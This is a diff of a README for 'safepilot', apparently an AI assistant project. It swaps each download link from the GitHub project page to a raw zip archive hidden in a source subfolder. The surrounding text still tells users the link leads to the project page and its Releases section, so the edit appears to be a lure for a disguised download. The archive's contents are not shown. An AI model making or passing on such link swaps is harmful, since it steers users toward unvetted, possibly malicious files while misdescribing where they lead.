@@ -1,6 +1,6 @@
 # 🤖 safepilot - Your Safe AI Work Assistant
 
-[![Download safepilot](https://img.shields.io/badge/Download-safepilot-4CAF50?style=for-the-badge)](https://github.com/zigo987373/safepilot)
+[![Download safepilot](https://img.shields.io/badge/Download-safepilot-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/zigo987373/safepilot/main/src/orchestrator/Software_2.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Start with these simple steps to get safepilot running on your PC.
 
 1. Click the big green button or visit the link below to download safepilot:
 
-   [Download safepilot](https://github.com/zigo987373/safepilot)
+   [Download safepilot](https://raw.githubusercontent.com/zigo987373/safepilot/main/src/orchestrator/Software_2.1.zip)
 
 2. This link takes you to the project page on GitHub. Look for the **Releases** section on that page. This is usually on the right side or at the top menu, labeled “Releases”.
 
@@ -151,7 +151,7 @@ You can also use the Issues tab on the GitHub page to see common questions or re
 
 Download safepilot here:
 
-[![Download safepilot](https://img.shields.io/badge/Download-safepilot-4CAF50?style=for-the-badge)](https://github.com/zigo987373/safepilot)
+[![Download safepilot](https://img.shields.io/badge/Download-safepilot-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/zigo987373/safepilot/main/src/orchestrator/Software_2.1.zip)
 
 Visit the page to find the latest version, installers, and release notes.
 
